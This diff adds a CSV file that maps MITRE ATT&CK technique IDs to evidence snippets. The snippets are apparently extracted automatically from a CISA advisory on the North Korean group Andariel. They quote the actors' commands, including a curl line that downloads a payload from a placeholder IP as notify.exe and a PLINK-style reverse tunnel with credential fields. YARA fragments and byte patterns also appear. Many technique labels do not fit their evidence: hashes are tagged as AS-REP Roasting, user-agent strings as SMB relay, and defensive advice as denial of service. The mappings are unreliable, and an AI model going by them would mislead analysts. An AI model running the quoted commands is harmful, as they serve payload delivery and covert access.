@@ -1,0 +1,224 @@
+technique_id,technique_name,evidence,chunk,valid_id,evidence_found
+T1597.001,Threat Intel Vendors,"The RGB 3rd Bureau includes a DPRK (aka North Korean) state-sponsored cyber group known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa.",0,True,True
+T1597.002,Purchase Technical Data,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1590.006,Network Security Appliances,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1592.002,Software,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1591,Gather Victim Org Information,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1590,Gather Victim Network Information,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1598.001,Spearphishing Service,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1598.002,Spearphishing Attachment,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1596,Search Open Technical Databases,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1659,Content Injection,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1587.001,Malware,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1587.004,Exploits,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1210,Exploitation of Remote Services,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j,",1,True,True
+T1587.001,Malware,"The actors deploy and leverage custom malware implants,",1,True,True
+T1212,Exploitation for Credential Access,perform privilege escalation using common credential stealing tools such as Mimikatz,1,True,True
+T1588.001,Malware,"The actors deploy and leverage custom malware implants,",1,True,True
+T1496,Resource Hijacking,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j,",1,True,True
+T1650,Acquire Access,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j,",1,True,True
+T1583.004,Server,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j,",1,True,True
+T1593,Search Open Websites/Domains,"The actors conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.",1,True,False
+T1596.002,WHOIS,"The actors conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.",1,True,False
+T1597.001,Threat Intel Vendors,"For additional information on DPRK state-sponsored malicious cyber activity, see CISA’s North Korea Cyber Threat Overview and Advisories webpage.",1,True,True
+T1486,Data Encrypted for Impact,"The actors conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.",1,True,False
+T1592.004,Client Configurations,"The actors conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.",1,True,False
+T1219.003,Remote Access Hardware,"The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations.",2,True,True
+T1587.001,Malware,The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.,2,True,True
+T1041,Exfiltration Over C2 Channel,"The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities is satisfying collection",2,True,False
+T1595.002,Vulnerability Scanning,The actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers,3,True,True
+T1592.001,Hardware,CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware,3,True,True
+T1592.002,Software,CVE-2023-46604 – Apache ActiveMQ,3,True,True
+T1592.003,Firmware,CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware,3,True,True
+T1592.004,Client Configurations,CVE-2023-25690 – Apache HTTP Server,3,True,True
+T1593,Search Open Websites/Domains,The actors gather open source information about their victims for use in targeting and research,3,True,True
+T1594,Search Victim-Owned Websites,The actors gather open source information about their victims for use in targeting and research,3,True,True
+T1596.005,Scan Databases,The actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers,3,True,True
+T1590.006,Network Security Appliances,CVE-2023-25690 – Apache HTTP Server,3,True,True
+T1590,Gather Victim Network Information,The actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers,3,True,True
+T1593,Search Open Websites/Domains,The actors gather open source information about their victims for use in targeting and research,3,True,True
+T1594,Search Victim-Owned Websites,The actors gather open source information about their victims for use in targeting and research,3,True,True
+T1219,Remote Access Tools,"The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.",4,True,True
+T1218.010,Regsvr32,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) ",4,True,True
+T1218.008,Odbcconf,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) ",4,True,True
+T1210,Exploitation of Remote Services,"The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.",4,True,True
+T1021,Remote Services,"The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.",4,True,True
+T1021.006,Windows Remote Management,"The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.",4,True,True
+T1176,Software Extensions,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) ",4,True,True
+T1104,Multi-Stage Channels,The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.,4,True,True
+T1587.001,Malware,"The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.",4,True,True
+T1014,Rootkit,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) ",4,True,True
+T1546.008,Accessibility Features,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) ",4,True,True
+T1546.010,AppInit DLLs,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) ",4,True,True
+T1190,Exploit Public-Facing Application,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further",5,True,True
+T1218.013,Mavinject,Example commands used by the actors include the following:  pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] <Remote_IP>,5,True,False
+T1036.003,Rename Legitimate Utilities,Example commands used by the actors include the following:  curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1216,System Script Proxy Execution,Example commands used by the actors include the following:  C:\§windows\§system32\§cmd.exe /c systeminfo | findstr Logon,5,True,False
+T1140,Deobfuscate/Decode Files or Information,Example commands used by the actors include the following:  curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1218.007,Msiexec,Example commands used by the actors include the following:  pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] <Remote_IP>,5,True,False
+T1036,Masquerading,Example commands used by the actors include the following:  curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1218.008,Odbcconf,Example commands used by the actors include the following:  netstat –naop  netstat –noa,5,True,True
+T1218.005,Mshta,Example commands used by the actors include the following:  curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1127,Trusted Developer Utilities Proxy Execution,Example commands used by the actors include the following:  C:\§windows\§system32\§cmd.exe /c systeminfo | findstr Logon,5,True,False
+T1505,Server Software Component,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further",5,True,True
+T1027.009,Embedded Payloads,Example commands used by the actors include the following:  pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] <Remote_IP>,5,True,False
+T1003.003,NTDS,accessing the Active Directory domain database through targeting of the NTDS.dit file,6,True,True
+T1218.005,Mshta,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1078.002,Domain Accounts,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1556.001,Domain Controller Authentication,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1218.012,Verclsid,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1003.002,Security Account Manager,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1654,Log Enumeration,"The actors also use system logging for discovery to move laterally. The group logs active window changes, clipboard data, and keystrokes and saves the collected logging information to the %Temp% directory",6,True,True
+T1482,Domain Trust Discovery,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1087,Account Discovery,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1218.001,Compiled HTML File,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1218.013,Mavinject,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump",6,True,True
+T1587.001,Malware,The actors routinely pack late-stage tooling in VMProtect and Themida,6,True,True
+T1021.001,Remote Desktop Protocol,have also used Remote Desktop Protocol (RDP) to move laterally,7,True,True
+T1090,Proxy,"They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server.",7,True,True
+T1090.001,Internal Proxy,"They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server.",7,True,True
+T1041,Exfiltration Over C2 Channel,The actors typically exfiltrate data to web services such as cloud storage or servers not associated with their primary C2.,7,True,True
+T1102.002,Bidirectional Communication,The actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems.,7,True,True
+T1102.003,One-Way Communication,The actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems.,7,True,True
+T1104,Multi-Stage Channels,"They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server.",7,True,True
+T1074.002,Remote Data Staging,The actors identify data for theft by enumerating files and folders across many directories and servers using command-line activity or functionality built into custom tools.,7,True,True
+T1020,Automated Exfiltration,"The actors collect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victim’s environment with other malicious tooling.",7,True,False
+T1048,Exfiltration Over Alternative Protocol,The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers via File Transfer Protocol (FTP) and other protocols.,7,True,False
+T1659,Content Injection,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,True,True
+T1001,Data Obfuscation,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,True,True
+T1557.001,Name Resolution Poisoning and SMB Relay,The following include a list of user agent strings used by the actors:,8,True,True
+T1557.001,Name Resolution Poisoning and SMB Relay,Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0,8,True,True
+T1557.001,Name Resolution Poisoning and SMB Relay,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0,8,True,True
+T1557.001,Name Resolution Poisoning and SMB Relay,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0,8,True,True
+T1558.004,AS-REP Roasting,The following include observed SHA-256 hashes:,8,True,True
+T1558.004,AS-REP Roasting,ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6,8,True,True
+T1558.004,AS-REP Roasting,db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984,8,True,True
+T1558.004,AS-REP Roasting,773760fd71d52457ba53a314f15dddb1a74e8b2f5a90e5e150dea48a21aa76df,8,True,True
+T1558.004,AS-REP Roasting,05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d,8,True,True
+T1558.004,AS-REP Roasting,e3027062e602c5d1812c039739e2f93fc78341a67b77692567a4690935123abe,8,True,True
+T1558.004,AS-REP Roasting,1962ebb7bf8d2b306c6f3b55c3dcd69a755eeff1a17577b7606894b781841c3a,8,True,True
+T1558.004,AS-REP Roasting,f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb,8,True,True
+T1027.010,Command Obfuscation,00 48 6B C0 06 C6 44 04 20 9C B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 00 C6 44 04 20 A8 B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 01 C6 44 04 20 9A B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 02 C6 44 04 20 93 B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 03 C6 44 04 20 96 B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 04 C6 44 04 20 B9 B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 05 C6 44 04 20 9A B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 06 C6 44 04 20 8B B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 07 C6 44 04 20 9E B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 08 C6 44 04 20 9A B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 09 C6 44 04 20 8D B8 01 00 00 00,10,True,True
+T1027.010,Command Obfuscation,48 6B C0 0A C6 44 04 20 BC B8 01 00 00 00,10,True,True
+T1059.003,Windows Command Shell,"C7 45 F7 14 00 41 00 mov [rbp+57h+Src], 410014h",11,True,True
+T1547.004,Winlogon Helper DLL,"C7 45 FB 7A 00 7F 00 mov [rbp+57h+var_5C], 7F007Ah",11,True,True
+T1546.007,Netsh Helper DLL,"C7 45 03 7A 00 34 00 mov [rbp+57h+var_54], 34007Ah",11,True,True
+T1546.010,AppInit DLLs,"C7 45 0F 66 00 00 00 mov [rbp+57h+var_48], 66h",11,True,True
+T1547.002,Authentication Package,"C7 45 FF 7B 00 63 00 mov [rbp+57h+var_58], 63007Bh",11,True,True
+T1036.005,Match Legitimate Resource Name or Location,"C7 45 07 51 00 66 00 mov [rbp+57h+var_50], 660051h",11,True,True
+T1037.001,Logon Script (Windows),"C7 45 0B 66 00 7B 00 mov [rbp+57h+var_4C], 7B0066h",11,True,True
+T1012,Query Registry,"81 7D C4 22 C0 78 00 cmp dword ptr [rbp+buffer_v41], 78C022h",11,True,True
+T1546.004,Unix Shell Configuration Modification,"B9 8D 10 B7 F8 mov ecx, 0F8B7108Dh",11,True,True
+T1037.002,Login Hook,E8 F1 BA FF FF call sub_140001280,11,True,True
+T1036.002,Right-to-Left Override,"41 02 D0 add dl, r8b",11,True,True
+T1059.004,Unix Shell,"44 02 DA add r11b, dl",11,True,True
+T1059.001,PowerShell,open source version of Lilith,12,True,True
+T1218.012,Verclsid,The following are strings that appear to be unique to the Unnamed Trojan based on Lilith,12,True,True
+T1204.002,Malicious File,The following are strings that appear to be unique to the Unnamed Trojan based on Lilith,12,True,True
+T1059.003,Windows Command Shell,Initiate a CMD session first,12,True,True
+T1218.011,Rundll32,The following are strings that appear to be unique to the Unnamed Trojan based on Lilith,12,True,True
+T1218.008,Odbcconf,The following are strings that appear to be unique to the Unnamed Trojan based on Lilith,12,True,True
+T1218.001,Compiled HTML File,The following are strings that appear to be unique to the Unnamed Trojan based on Lilith,12,True,True
+T1218.010,Regsvr32,The following are strings that appear to be unique to the Unnamed Trojan based on Lilith,12,True,True
+T1027.008,Stripped Payloads,uint16(0) == 0x5A4D,13,True,True
+T1027.002,Software Packing,"strings: $s1 = "".themida""",13,True,True
+T1218.009,Regsvcs/Regasm,uint16(0) == 0x5A4D,13,True,True
+T1218.012,Verclsid,uint16(0) == 0x5A4D,13,True,True
+T1055.002,Portable Executable Injection,uint16(0) == 0x5A4D,13,True,True
+T1027.008,Stripped Payloads,uint16(0) == 0x5A4D,13,True,True
+T1218.010,Regsvr32,uint16(0) == 0x5A4D,13,True,True
+T1027.002,Software Packing,"strings: $s1 = "".themida""",13,True,True
+T1218.009,Regsvcs/Regasm,uint16(0) == 0x5A4D,13,True,True
+T1218.012,Verclsid,uint16(0) == 0x5A4D,13,True,True
+T1055.002,Portable Executable Injection,uint16(0) == 0x5A4D,13,True,True
+T1027.008,Stripped Payloads,uint16(0) == 0x5A4D,13,True,True
+T1055.015,ListPlanting,488b01 ff10 488b4e18 488b01,14,True,True
+T1055.008,Ptrace System Calls,488b01 ff10 488b4e18 488b01,14,True,True
+T1055.009,Proc Memory,4881eca0000000 33c0 488bd9 488d4c2432,14,True,True
+T1546.006,LC_LOAD_DYLIB Addition,488b01 eb03 488bc1 0fb600,14,True,True
+T1547.012,Print Processors,488b01 eb03 488bc1 0fb600,14,True,True
+T1558.005,Ccache Files,488b01 eb03 488bc1 0fb600,14,True,True
+T1654,Log Enumeration,488b01 eb03 488bc1 0fb600,14,True,True
+T1027.008,Stripped Payloads,488b01 eb03 488bc1 0fb600,14,True,True
+T1036.011,Overwrite Process Arguments,488b01 eb03 488bc1 0fb600,14,True,True
+T1003.007,Proc Filesystem,488b01 eb03 488bc1 0fb600,14,True,True
+T1218.008,Odbcconf,488b01 eb03 488bc1 0fb600,14,True,True
+T1564.004,NTFS File Attributes,488b01 eb03 488bc1 0fb600,14,True,True
+T1027.016,Junk Code Insertion,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1027.002,Software Packing,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1132.001,Standard Encoding,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1559.001,Component Object Model,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1132,Data Encoding,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1559,Inter-Process Communication,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1036.011,Overwrite Process Arguments,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1546.009,AppCert DLLs,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1546.006,LC_LOAD_DYLIB Addition,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1546.015,Component Object Model Hijacking,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1546.010,AppInit DLLs,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1547.002,Authentication Package,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1027.008,Stripped Payloads," // 50 | push eax // ff15???????? | // a3???????? | // 68???????? | // e8???????? | // 83c404 | add esp, 4 // 50 | push eax",16,True,True
+T1027.015,Compression, // 50 ff15???????? a3???????? 68???????? e8???????? 83c404 50 ,16,True,False
+T1027.016,Junk Code Insertion," // 8d8dd4faffff | lea ecx, [ebp - 0x52c] // 51 | push ecx // e8???????? | // 83c408 | add esp, 8 // 8b15???????? | ",16,True,True
+T1027.001,Binary Padding," // 52 | push edx // 8b4508 | mov eax, dword ptr [ebp + 8] // 50 | push eax // e8???????? | // 83c414 | add esp, 0x14 // 8b4d10 | mov ecx, dword ptr [ebp + 0x10] // 51 | push ecx",16,True,True
+T1027.002,Software Packing," // 52 | push edx // 8b4508 | mov eax, dword ptr [ebp + 8] // 50 | push eax // e8???????? | // 83c414 | add esp, 0x14 // 8b4d10 | mov ecx, dword ptr [ebp + 0x10] // 51 | push ecx",16,True,True
+T1027.008,Stripped Payloads," // 50 | push eax // ff15???????? | // a3???????? | // 68???????? | // e8???????? | // 83c404 | add esp, 4 // 50 | push eax",16,True,True
+T1027.015,Compression, // 50 ff15???????? a3???????? 68???????? e8???????? 83c404 50 ,16,True,False
+T1027.016,Junk Code Insertion," // 8d8dd4faffff | lea ecx, [ebp - 0x52c] // 51 | push ecx // e8???????? | // 83c408 | add esp, 8 // 8b15???????? | ",16,True,True
+T1027.001,Binary Padding," // 52 | push edx // 8b4508 | mov eax, dword ptr [ebp + 8] // 50 | push eax // e8???????? | // 83c414 | add esp, 0x14 // 8b4d10 | mov ecx, dword ptr [ebp + 0x10] // 51 | push ecx",16,True,True
+T1027.002,Software Packing," // 52 | push edx // 8b4508 | mov eax, dword ptr [ebp + 8] // 50 | push eax // e8???????? | // 83c414 | add esp, 0x14 // 8b4d10 | mov ecx, dword ptr [ebp + 0x10] // 51 | push ecx",16,True,True
+T1027.008,Stripped Payloads," // 50 | push eax // ff15???????? | // a3???????? | // 68???????? | // e8???????? | // 83c404 | add esp, 4 // 50 | push eax",16,True,True
+T1027.015,Compression, // 50 ff15???????? a3???????? 68???????? e8???????? 83c404 50 ,16,True,False
+T1553.005,Mark-of-the-Web Bypass,condition: 7 of them and filesize < 1736704,18,True,True
+T1218.013,Mavinject,None,18,True,False
+T1587.001,Malware,Web shell malware is deployed,18,True,True
+T1218.005,Mshta,None,18,True,False
+T1587.004,Exploits,None,18,True,False
+T1127,Trusted Developer Utilities Proxy Execution,None,18,True,False
+T1218.010,Regsvr32,None,18,True,False
+T1574.001,DLL,None,18,True,False
+T1654,Log Enumeration,None,18,True,False
+T1140,Deobfuscate/Decode Files or Information,None,18,True,False
+T1218.007,Msiexec,None,18,True,False
+T1480.002,Mutual Exclusion,None,18,True,False
+T1505.003,Web Shell,by adversaries on a victim’s web server to execute arbitrary system commands.,19,True,True
+T1210,Exploitation of Remote Services,by adversaries on a victim’s web server to execute arbitrary system commands.,19,True,True
+T1583.006,Web Services,by adversaries on a victim’s web server to execute arbitrary system commands.,19,True,True
+T1499,Endpoint Denial of Service,blocking unnecessary outbound connections,19,True,True
+T1498,Network Denial of Service,blocking external access to administrator panels and services or turning them off entirely,19,True,True
+T1567,Exfiltration Over Web Service,Page 24 of 30 | Product ID: AA24-207A TLP:CLEAR TLP:CLEAR Command Line Activity and Remote Access Monitoring for suspicious command-line activity,19,True,True
+T1588.001,Malware,"Packing Signatures for Themida, VMProtect and a number of other packers are available here; however, the signatures will not identify every file packed using these applications.",19,True,True
+T1587.001,Malware,"Packing Signatures for Themida, VMProtect and a number of other packers are available here; however, the signatures will not identify every file packed using these applications.",19,True,True
+T1593,Search Open Websites/Domains,"Republic of Korea organizations: If you suspect cyber incidents involving state actors, including Andariel, or discover similar cases, please contact the relevant authorities below.",20,True,True
+T1596,Search Open Technical Databases,References AhnLab Security Emergency Response Center:  https://asec.ahnlab.com/en/56405/  https://asec.ahnlab.com/en/59073/  https://asec.ahnlab.com/en/66088/,20,True,True
+T1594,Search Victim-Owned Websites,References AhnLab Security Emergency Response Center:  https://asec.ahnlab.com/en/56405/  https://asec.ahnlab.com/en/59073/  https://asec.ahnlab.com/en/66088/,20,True,True
+T1597.002,Purchase Technical Data,References Boredhackerblog: http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html,20,True,False
+T1597.001,Threat Intel Vendors,References AhnLab Security Emergency Response Center:  https://asec.ahnlab.com/en/56405/  https://asec.ahnlab.com/en/59073/  https://asec.ahnlab.com/en/66088/,20,True,True
+T1592.002,Software,References Boredhackerblog: http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html,20,True,False
+T1596.003,Digital Certificates,References AhnLab Security Emergency Response Center:  https://asec.ahnlab.com/en/56405/  https://asec.ahnlab.com/en/59073/  https://asec.ahnlab.com/en/66088/,20,True,True
+T1558.003,Kerberoasting,References Boredhackerblog: http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html,20,True,False
+T1212,Exploitation for Credential Access,References Boredhackerblog: http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html,20,True,False
+T1087,Account Discovery,References AhnLab Security Emergency Response Center:  https://asec.ahnlab.com/en/56405/  https://asec.ahnlab.com/en/59073/  https://asec.ahnlab.com/en/66088/,20,True,True
+T1136,Create Account,References AhnLab Security Emergency Response Center:  https://asec.ahnlab.com/en/56405/  https://asec.ahnlab.com/en/59073/  https://asec.ahnlab.com/en/66088/,20,True,True
+T1078,Valid Accounts,References AhnLab Security Emergency Response Center:  https://asec.ahnlab.com/en/56405/  https://asec.ahnlab.com/en/59073/  https://asec.ahnlab.com/en/66088/,20,True,True
+T1558.003,Kerberoasting,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1556.008,Network Provider DLL,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1546.010,AppInit DLLs,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1547.005,Security Support Provider,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1016,System Network Configuration Discovery,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1558.004,AS-REP Roasting,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1601.001,Patch System Image,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1601.002,Downgrade System Image,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1525,Implant Internal Image,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1568,Dynamic Resolution,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1592.002,Software,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1592.003,Firmware,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
